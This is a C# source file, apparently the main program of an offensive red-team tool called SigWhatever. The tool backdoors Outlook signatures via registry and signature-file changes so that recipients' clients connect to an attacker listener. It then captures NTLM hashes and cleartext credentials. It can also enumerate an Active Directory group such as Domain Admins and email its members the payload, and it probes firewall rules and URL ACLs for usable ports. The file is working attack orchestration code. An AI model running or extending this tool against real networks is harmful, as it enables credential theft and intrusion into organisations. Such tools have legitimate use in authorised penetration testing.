using System;
using System.IO;
using NDesk.Options;
using System.Collections;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Linq;

namespace Sigwhatever
{
    class Program
    {
        public static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
        public static Hashtable httpSessionTable = Hashtable.Synchronized(new Hashtable());
        public static IList<string> outputList = new List<string>();
        static IList<string> consoleList = new List<string>();
        static IList<string> logList = new List<string>();
        static IList<string> logFileList = new List<string>();
        public static IList<string> cleartextList = new List<string>();
        public static IList<string> cleartextFileList = new List<string>();
        public static IList<string> hostList = new List<string>();
        public static IList<string> hostFileList = new List<string>();
        public static IList<string> ntlmv1List = new List<string>();
        public static IList<string> ntlmv2List = new List<string>();
        public static IList<string> ntlmv1FileList = new List<string>();
        public static IList<string> ntlmv2FileList = new List<string>();
        public static IList<string> ntlmv1UsernameList = new List<string>();
        public static IList<string> ntlmv2UsernameList = new List<string>();
        public static IList<string> ntlmv1UsernameFileList = new List<string>();
        public static IList<string> ntlmv2UsernameFileList = new List<string>();
        public static bool consoleOutput = true;
        public static bool exitInveigh = false;
        public static bool enabledConsoleUnique = false;
        public static bool enabledElevated = false;
        public static bool enabledFileOutput = false;
        public static bool enabledFileUnique = false;
        public static bool enabledHTTP = false;
        public static bool enabledDHCPv6 = false;
        public static bool enabledDHCPv6Local = false;
        public static bool enabledDNS = false;
        public static bool enabledInspect = false;
        public static bool enabledNBNS = false;
        public static bool enabledLLMNR = false;
        public static bool enabledLLMNRv6 = false;
        public static bool enabledLogOutput = false;
        public static bool enabledMDNS = false;
        public static bool enabledPcap = false;
        public static bool enabledProxy = false;
        public static bool enabledMachineAccounts = false;
        public static bool enabledSMB = false;
        public static bool enabledSpooferRepeat = false;

        // begin parameters - set defaults as needed before compile
        public static string argFileOutputDirectory = Directory.GetCurrentDirectory();
        public static string argFilePrefix = "Log";

        static void ShowHelp(OptionSet opt)
        {
            Console.WriteLine("Usage: SigWhatever.exe [OPTIONS]+ operation");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Options:");
            opt.WriteOptionDescriptions(Console.Out);

            Console.WriteLine("\nOperations:");
            Console.WriteLine("  AUTO: Just do everything for me - backdoor the signature and start the listener on this box.");
            Console.WriteLine("  Usage: SigWhatever.exe AUTO\n");
            Console.WriteLine("  CHECKTRUST: Check whether the trust zone settings - if the domain isn't in there then this probably won't work");
            Console.WriteLine("  Usage: SigWhatever.exe CHECKTRUST\n");
            Console.WriteLine("  CHECKFW: Check whether the host based firewall is on and whether there's an exception for the chosen port");
            Console.WriteLine("  Usage: SigWhatever.exe CHECKFW -p <port>\n");
            Console.WriteLine("  SIGNATURE: hijack the current user's signature, or add a new one via registry changes");
            Console.WriteLine("  Usage: SigWhatever.exe SIGNATURE -p <port> -l <logfile> -u <url prefix> --backdoor-all --force\n");
            Console.WriteLine("  SIGNOLISTEN: hijack the current user's signature, or add a new one via registry changes");
            Console.WriteLine("  Usage: SigWhatever.exe SIGNOLISTEN -s <server> -p <port> -l <logfile> --backdoor-all>\n");
            Console.WriteLine("  CLEANUP: Remove any modifications to the registry or htm signature files");
            Console.WriteLine("  Usage: SigWhatever.exe CLEANUP\n");
            Console.WriteLine("  EMAILADMINS: Enumerate email addresses from an AD group and send them a 'blank' email with the payload.");
            Console.WriteLine("  Usage: SigWhatever.exe EMAILADMINS -g <Active Directory group> -p <port> -l <logfile> --force\n");
            Console.WriteLine("  LISTENONLY: Just start the listener - make sure it's on the same port ");
            Console.WriteLine("  Usage: SigWhatever.exe LISTENONLY -p <port> -l <logfile>\n");
            Console.WriteLine("  SHOWACLS: List all URL Reservation ACLs with User, Everyone or Authenticated Users permissions. ");
            Console.WriteLine("  Usage: SigWhatever.exe SHOWACLS\n");
            Console.WriteLine("  NOTE: With the signature option, if --backdoor-all is not specified then the tool will attempt to get the current" +
                " signature from Outlook - this may cause a popup for the user if their AV is out of date.");
        }

        static void Main(string[] args)
        {
            string operation = "";
            string port = "";
            string newsigname = "default";
            string logfile = "";
            bool force = false;
            string group = "";
            string findexisting = "";
            string urlPrefix = "";
            string argChallenge = "";
            bool backdoorAll = false;
            bool showHelp = false;
            string hostname = Environment.MachineName;
            string server = "";

            var opt = new OptionSet() {
            { "p|port=", "TCP Port.",
                v => port = v },
            { "s|server=", "Remote Server.",
                v => server = v },
            { "l|log=", "Log file path.",
                v => logfile = v },
            { "g|group=", "Target Active Directory group.",
                v => group = v },
            { "f|force", "Force HTTP server start.",
                v => force = v != null },
            { "ba|backdoor-all", "Backdoor all signatures.",
                v => backdoorAll = v != null },
            { "c|challenge=", "NTLM Challenge (in hex).",
                v => argChallenge = v },
            { "u|url-prefix=", "URL Prefix. e.g. /MDEServer/test",
                v => urlPrefix = v },
            { "h|help",  "Show this message and exit.",
                v => showHelp = v != null },
            };

            List<string> extra;
            try
            {
                extra = opt.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine("Try '--help' for more information.");
                return;
            }

            if (extra.Count > 0)
            {
                operation = extra[0].ToUpper();
            }
            else
            {
                showHelp = true;
            }

            if (showHelp)
            {
                ShowHelp(opt);
                return;
            }

            // Notes for auto mode.
            // Is anything set in the trusted zone?
            // Is the firewall down?
            // Are there any ports we can use?
            // Is there anything bound to those ports?
            // Run the sig insert with 'ALL'

            if (operation.ToUpper() == "AUTO")
            {
                Console.WriteLine("\n[+] AUTO mode selected, trying to do everything...");

                // Is anything set in the trusted zone?
                string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
                Util util = new Util();

                string internetsettings = util.ListInternetSettings();
                if (internetsettings.Contains(domainName) && domainName != "")
                {
                    Console.WriteLine($"[+] Trust settings contain the domain {domainName} - the tool will usually use NETBIOS names for the listener, this might mean you can manually specify full DNS");
                }
                else
                {
                    Console.WriteLine("[!] Can't see the domain in the trust zone settings so let's hope other clients can resolve by hostname");
                }

                // Is the firewall down, or can we bind to any ports that are allowed through?
                if (!string.IsNullOrEmpty(port))
                {
                    Console.WriteLine($"[*] Using specified port {port}");
                }
                else
                {
                    List<int> ports = util.GetFwInbound();
                    try
                    {
                        if (ports[0] != 0)
                        {
                            foreach (int p in ports)
                            {
                                bool inuse = util.PortFree(p);
                                if (!inuse)
                                {
                                    Console.WriteLine($"[+] Using open port {ports[0]}");
                                    port = p.ToString();
                                    break;
                                }
                            }
                        }
                        else
                        {
                            // TODO: random free port
                            port = "8000";
                            Console.WriteLine($"[YAY] Using any port because the fw is down - this time it's {port}");
                        }
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("[ERROR] Firewall enabled and no ports available, maybe you need to find somewhere else to listen?");
                        return;
                    }
                }

                // Run the sig insert with 'ALL'
                string existingsig = "ALL";

                Console.WriteLine("[*] Starting to mod signature.");
                ClsModSig ModSigAuto = new ClsModSig();
                ModSigAuto.ModSignature(hostname, urlPrefix, port, newsigname, false, existingsig);

                if (util.HasWriteAccessToFolder())
                {
                    logfile = "log.txt";
                }
                else
                {
                    logfile = Path.Combine(Path.GetTempPath(), "log.txt");
                    Console.WriteLine($"[ERROR] Can't write to the current working directory - defaulting to {logfile}");
                }
                Console.WriteLine($"[+] Done signature mods, starting to listen and log to {logfile}");
                Console.WriteLine("[IMPORTANT] The signature change will not take effect until Outlook is restarted, so you'll need to kill the process");
                StartListening("", port, logfile, argChallenge, force);
                return;
            }

            if (operation == "CHECKTRUST")
            {
                Util util = new Util();
                util.ListInternetSettings();
                return;
            }

            if (operation == "SHOWACLS")
            {
                Console.WriteLine("[*] Listing URL Prefixes with User permissions:\n");
                AclHelper helper = new AclHelper();
                foreach (string url in helper.GetAcls().Where(u => u.StartsWith("http:")))
                {
                    Console.WriteLine($"[*] URL: {url}");
                    port = url.Split(':')[2].Split('/')[0];
                    if (Util.IsSystemException(port))
                        Console.WriteLine("[+] Firewall exception exists for this port");
                    Console.WriteLine();
                }
                return;
            }

            if (operation == "CHECKFW")
            {
                if (string.IsNullOrEmpty(port))
                {
                    Console.WriteLine("[ERROR] Supply a port - for example: SigWhatever.exe checkfw -p 8080");
                    return;
                }

                // check for regular TCP rules
                Util util = new Util();
                util.CheckFirewall(Convert.ToInt32(port));

                // Check if there is an Exception for SYSTEM
                if (Util.IsSystemException(port))
                    Console.WriteLine($"[+] An exception for the System process exists for port {port}. If a permissive URL ACL exists for this port then you can use it with the -u parameter");
                return;
            }

            // Initialise some classes and get the local host name for starting the listener
            ClsModSig ModSig = new ClsModSig();

            if (operation == "SIGNATURE")
            {
                if (string.IsNullOrEmpty(port))
                {
                    Console.WriteLine("[ERROR] Supply a port - for example: SigWhatever.exe signature -p 8080");
                    return;
                }

                // Set the existing string to ALL to tell the ModSignature function that we're just going to backdoor all sigs
                string existingsig = "ALL";

                if (findexisting.Length > 1)
                {
                    Console.WriteLine("[+] Just going to mod everything in the folder");
                    ModSig.ModSignature(hostname, urlPrefix, port, newsigname, false, existingsig);

                    Console.WriteLine("[+] Done signature mods, starting to listen");
                    StartListening(urlPrefix, port, logfile, argChallenge, force);
                    return;
                }
                else
                {
                    Console.WriteLine("[+] Creating Outlook object to try to get existing signature text - this may pop up a warning.");

                    ClsOutlook ol = new ClsOutlook();
                    existingsig = ol.GetExistingSig();

                    if (existingsig == null)
                        return;

                    ModSig.ModSignature(hostname, urlPrefix, port, newsigname, false, existingsig);

                    Console.WriteLine("[+] Done signature mods, starting to listen");
                    Console.WriteLine("[IMPORTANT] The signature change will not take effect until Outlook is restarted, so you'll need to kill the process");
                    StartListening(urlPrefix, port, logfile, argChallenge, force);
                    return;
                }
            }

            if (operation == "SIGNOLISTEN")
            {
                if (string.IsNullOrEmpty(server) || string.IsNullOrEmpty(port))
                {
                    Console.WriteLine("[ERROR] Supply a server - for example: SigWhatever.exe signolisten -s server.domain.com -p 8080");
                    return;
                }

                if (backdoorAll)
                {
                    // Set the existing string to all to tell the ModSignature function that we're just going to backdoor all sigs
                    Console.WriteLine("[+] Just going to mod everything in the folder");
                    ModSig.ModSignature(server, urlPrefix, port, newsigname, false, "ALL");
                    Console.WriteLine($"[+] Done signature mods, make sure you can start a listener on {server}:{port}");
                }
                else
                {
                    Console.WriteLine("[NOTE] Creating Outlook object to try to get existing signature text - this may pop up a warning.");
                    ClsOutlook ol = new ClsOutlook();

                    string existingsig = ol.GetExistingSig();
                    if (existingsig == null)
                        return;

                    ModSig.ModSignature(server, urlPrefix, port, newsigname, false, existingsig);
                    Console.WriteLine($"[IMPORTANT] Done signature mods, make sure you can start a listener on {server}:{port}");
                    Console.WriteLine("[IMPORTANT] The signature change will not take effect until Outlook is restarted, so you'll need to kill the process");
                }
            }

            if (operation == "CLEANUP")
            {
                port = "80";
                ModSig.ModSignature("", "", port, newsigname, true, "");
                Console.WriteLine("[IMPORTANT] The signature change will not take effect until Outlook is restarted, so you'll need to kill the process");
            }

            if (operation == "LISTENONLY")
            {
                if (string.IsNullOrEmpty(port))
                {
                    Console.WriteLine("[ERROR] Supply a port and logfile (optional) - for example: SigWhatever.exe listenonly -p 8080 -l logfile.txt");
                    return;
                }
                StartListening(urlPrefix, port, logfile, argChallenge, force);
                return;
            }

            if (operation == "EMAILADMINS")
            {
                if (String.IsNullOrEmpty(port) || String.IsNullOrEmpty(group))
                {
                    Console.WriteLine("[ERROR] Supply a group and port - for example: SigWhatever.exe emailadmins -g \"Domain Admins\" -p 8080");
                    return;
                }

                List<string> lstEmails = new List<string>();

                try
                {
                    ClsLDAP ld = new ClsLDAP();
                    string domain = Environment.UserDomainName;
                    Console.WriteLine($"[+] Getting emails from the {group} group for {domain}");
                    lstEmails = ld.EnumGroupEmails(group, domain);
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] Error enumerating group emails");
                    return;
                }

                string bodyhtml = ModSig.MakeNewHTML(hostname, urlPrefix, port);

                ClsOutlook ol = new ClsOutlook();
                ol.SendEmail(lstEmails, "Empty", bodyhtml);

                Console.WriteLine("[+] Sent emails, starting to listen");
                StartListening(urlPrefix, port, logfile, argChallenge, force);
                return;
            }
        }

        private static void StartListening(string urlPrefix, string port, string logfile, string argChallenge, bool force)
        {
            /*Util util = new Util();
            if (!util.CheckFirewall(Convert.ToInt32(port)) && !force)
            {
                Console.WriteLine("[ERROR] Exiting because it doesn't look like it's possible to listen on any ports. You can override this by ending the command line with --force");
            }*/

            if (logfile.Length == 0)
            {
                logfile = null;
            }

            if (!string.IsNullOrEmpty(urlPrefix))
            {
                HTTPCap capture = new HTTPCap();
                capture.Doit(urlPrefix, port, logfile, argChallenge);
            }
            else
            {
                TCPHTTPCap capture = new TCPHTTPCap();
                capture.Doit(port, logfile, argChallenge);
            }
        }
    }
}
